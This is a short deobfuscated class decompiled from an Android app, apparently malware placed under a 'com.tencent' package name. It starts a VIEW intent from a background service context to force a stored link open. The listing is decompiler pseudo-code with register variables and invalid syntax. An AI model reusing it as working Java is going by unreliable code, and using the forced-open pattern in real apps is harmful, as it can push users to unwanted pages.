package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: PersistentService_2
 * Original: Lcom/tencent/entitledoswimmingo21$2;
 */
class PersistentService_2 implements Runnable; {

    // === FIELDS ===
    final String val$link;

    // === METHODS ===

     void Constructor(String param0) {
        v0.val$link = v1;
        // new Object()
        return;
    }

    public void run() {
        v0 = new Intent();
        v1 = v3.val$link;
        v2 = Uri.parse(v1);
        v2 = "android.intent.action.VIEW";
        // new Intent("android.intent.action.VIEW", v1)
        v1 = 268435456; // 0x10000000
        v0.setFlags(v1);
        v1 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v1.startActivity(v0);
        return;
    }
}
